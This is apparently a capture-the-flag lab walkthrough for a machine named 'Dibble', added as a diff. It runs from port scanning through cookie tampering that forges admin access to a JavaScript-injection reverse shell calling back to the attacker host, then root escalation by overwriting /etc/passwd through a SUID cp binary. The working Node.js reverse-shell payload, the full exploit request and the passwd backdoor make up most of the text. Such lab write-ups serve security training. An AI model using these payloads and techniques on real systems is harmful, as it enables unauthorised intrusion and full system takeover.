@@ -1,0 +1,165 @@
+																			                        Dibble Walkthrough
+																			
+																								
+Attacker's Machine: 192.168.45.5
+Victim's Machine: 192.168.204.110
+export IP=192.168.204.110
+	
+nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+
+21/tcp    open  ftp
+22/tcp    open  ssh
+80/tcp    open  http
+3000/tcp  open  ppp
+27017/tcp open  mongod
+
+nmap -Pn -n -sC -sV -p21,22,80,3000,27017 $IP --open --stats-every=5s -oN results.txt
+
+21/tcp    open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+22/tcp    open  ssh     OpenSSH 8.3 (protocol 2.0)
+80/tcp    open  http    Apache httpd 2.4.46 ((Fedora))
+|_http-server-header: Apache/2.4.46 (Fedora)
+| http-robots.txt: 22 disallowed entries (15 shown)
+| /core/ /profiles/ /README.txt /web.config /admin/ 
+| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/ 
+| /user/password/ /user/login/ /user/logout/ /index.php/admin/ 
+|_/index.php/comment/reply/
+|_http-title: Home | Hacking Articles
+|_http-generator: Drupal 9 (https://www.drupal.org)
+3000/tcp  open  http    Node.js (Express middleware)
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+27017/tcp open  mongodb MongoDB 4.2.9
+
+
+nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
+ <!-- nothing -->
+ 
+ 
+Port 80
+# Since we know that Drupal is used, let's do a scan with droopescan
+
+droopescan scan drupal -u http://$IP:80
+[+] No plugins found.                                                           
+
+[+] Themes found:
+    gin http://192.168.204.110:80/themes/gin/
+        http://192.168.204.110:80/themes/gin/README.md
+        http://192.168.204.110:80/themes/gin/LICENSE.txt
+
+[+] Possible version(s):
+    9.0.6
+    9.0.7
+
+[+] Possible interesting urls found:
+    Default admin - http://192.168.204.110:80/user/login
+
+# nothing of value was discovered at first, let's invest some time in port 3000
+
+
+Port 3000
+# It seems that we can create a new user within the application.
+account:
+test
+123456
+
+# Access the section See All Events and notice that we have some possible usernames, maybe we can use them later of in case we are stuck.
+
+administrator
+Happy_message
+comprendre
+Mayroong
+
+# Go to “New even log” and try to post a new message, but you are being stopped by an error messages stating that “Only the admin can update the Event logs”
+   Intercept the POST request and let's see if we find anything usefull that might help us in bypassing this restriction. 
+   Take a look at the session cookie: We can see that it's a base64 encoded value, decode it let's see if we can modify it.
+   
+Cookie: connect.sid=s%3A3aCU-gmSmnMcRgdmCCOLcqxPjfzIPbgd.ddKQFUSYaSd8Jd5b0F7sow%2FGKF%2F4NGKkaGzo60LdNkY; userLevel=ZGVmYXVsdA%3D%3D
+
+ZGVmYXVsdA%3D%3D         |             default
+
+# Since if has the default value, let's change it to admin and encode it back again in base64.
+ Cookie: connect.sid=s%3A3aCU-gmSmnMcRgdmCCOLcqxPjfzIPbgd.ddKQFUSYaSd8Jd5b0F7sow%2FGKF%2F4NGKkaGzo60LdNkY; userLevel=YWRtaW4=
+                                   
+# Resend the request and notice that now we are able to post new even logs. Good ... progress :)
+# Since we know that the application is using NodeJs, let's try to test is javascript is running within any of the parameters Username of the issue or Event Message (add technical details/code if required)
+
+   Insert 3+2 in both parameters to see if any of them are being executed by javascript.
+   
+   User:	3+2	Event log:	5
+   
+# Ok, now that we know that the Event message is vulnerable to javascript injection, let's use a nodejs reverse shell payload. Use a port already opened on the machine.
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs
+
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(21, "192.168.45.5", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
+
+POST /logs/new HTTP/1.1
+Host: 192.168.204.110:3000
+Cookie: connect.sid=s%3A3Zch4vjAS9kMAl6ZzKN_RrzlN7B2AyQ-.TrYwt9Pzp0e6W0WdwN%2FWydUTSeRJJDZKTJp%2BLtZoSM8; userLevel=YWRtaW4=
+
+username=1234&msg=(function(){
+++++var+net+%3d+require("net"),
+++++++++cp+%3d+require("child_process"),
+++++++++sh+%3d+cp.spawn("/bin/sh",+[])%3b
+++++var+client+%3d+new+net.Socket()%3b
+++++client.connect(21,+"192.168.45.5",+function(){
+++++++++client.pipe(sh.stdin)%3b
+++++++++sh.stdout.pipe(client)%3b
+++++++++sh.stderr.pipe(client)%3b
+++++})%3b
+++++return+/a/%3b+//+Prevents+the+Node.js+application+from+crashing
+})()%3b
+
+nc -lvnp 21                                          # Got shell
+
+cat /home/benjamin/local.txt                # Flag: 87a6981fa6c868750fe5884734b9dd11
+
+
+Privilege escalation
+
+cat /var/www/html/sites/default/settings.php
+'database' => 'databasename',
+ *   'username' => 'sqlusername',
+ *   'password' => 'sqlpassword',
+ *   'host' => 'localhost',
+ *   'port' => '3306',
+ 
+find / -perm -u=s -type f 2>/dev/null
+/usr/bin/cp
+
+# Since we don't have an editor available let's use a different way to create a passwd file and overwrite the existing /etc/passwd file
+    To avoid any issues, grab the content of the original etc/passwd file and add one more line where we define a new username  ‘urs’ with root privileges
+
+cat <<EOF > passwd
+>root:x:0:0:root:/root:/bin/bash
+>bin:x:1:1:bin:/bin:/sbin/nologin
+>...........................................................
+>benjamin:x:1000:1000::/home/benjamin:/bin/bash
+>nginx:x:994:991:Nginx web server:/var/lib/nginx:/sbin/nologin
+>urs::0:0:root:/root:/bin/bash
+EOF
+
+# Now, replace the contents of the /etc/passwd file with the contents of your file ‘passwd’
+
+/usr/bin/cp passwd /etc/passwd/
+
+# Now log in with the new username ‘urs’
+
+su urs
+id
+uid=0(root) gid=0(root) groups=0(root)
+cat /root/proof.txt                                                      # Flag: cb2913cb6302b9c26b073f328fb8d1f4       
+
